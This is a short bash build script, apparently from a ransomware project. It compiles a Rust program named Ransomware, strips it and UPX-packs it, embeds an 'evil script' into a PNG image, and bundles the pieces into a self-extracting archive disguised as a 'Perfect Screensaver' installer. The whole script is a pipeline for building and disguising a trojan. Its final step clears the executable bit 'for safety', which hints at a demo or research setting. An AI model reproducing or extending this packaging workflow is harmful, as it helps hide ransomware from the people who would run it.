#!/bin/bash

echo "Removing old files"
rm evil_scr/dw.tar.gz evil_scr/NightSky.png evil_scr/perfect_screensaver

cd Ransomware
echo "Building the ransomware"
cargo build --release
mv target/release/Ransomware target/release/h3h3
echo "Stripping the ransomware"
strip target/release/h3h3
echo "Packing the ransomware"
upx -9 target/release/h3h3
cd ..

cd Embedder
echo "Embedding the evil script"
source bin/activate
python main.py
cd ..
echo "Copying the evil script"
mv NightSky.png evil_scr/NightSky.png

echo "Creating tarball for stage1"
tar -czvf evil_scr/dw.tar.gz stage1 > /dev/null 2>&1

echo "Creating self-extracting archive"
makeself --gzip --target /tmp evil_scr/ ../release/perfect_screensaver "Perfect Screensaver" ./run.sh

chmod -x ../release/perfect_screensaver # remove executable bit for safety

echo "Done!"